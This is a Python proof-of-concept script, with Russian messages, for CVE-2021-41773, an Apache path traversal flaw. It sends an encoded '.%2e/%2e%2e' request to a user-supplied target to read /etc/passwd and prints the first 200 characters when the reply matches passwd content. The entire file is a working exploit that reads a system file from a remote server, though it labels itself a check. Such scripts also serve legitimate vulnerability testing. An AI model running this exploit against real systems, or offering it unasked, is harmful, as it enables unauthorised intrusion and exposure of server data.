import argparse
import requests

PATH = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


def build_url(base: str, path: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base.rstrip("/") + "/" + path.lstrip("/")


def looks_like_passwd(text: str) -> bool:
    return ("root:x:0:0:" in text) or ("/bin/bash" in text)


def check(base_url: str, timeout: float = 8.0) -> None:
    url = build_url(base_url, PATH)
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=False)
        sample = r.text[:200]

        if r.status_code == 200 and looks_like_passwd(r.text):
            print("[+] Похоже на path traversal / чтение /etc/passwd")
            print(sample)
        else:
            print("[-] Не подтверждено")
            print("HTTP:", r.status_code)
            print(sample)

    except requests.RequestException as e:
        print("[-] Ошибка запроса:", e)


def main():
    parser = argparse.ArgumentParser(
        description="PoC check for CVE-2021-41773 (Apache path traversal)"
    )
    parser.add_argument(
        "target",
        help="Домен или URL для проверки (example.com или https://example.com)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=8.0,
        help="Таймаут HTTP-запроса (по умолчанию 8 секунд)",
    )

    args = parser.parse_args()
    check(args.target, args.timeout)


if __name__ == "__main__":
    main()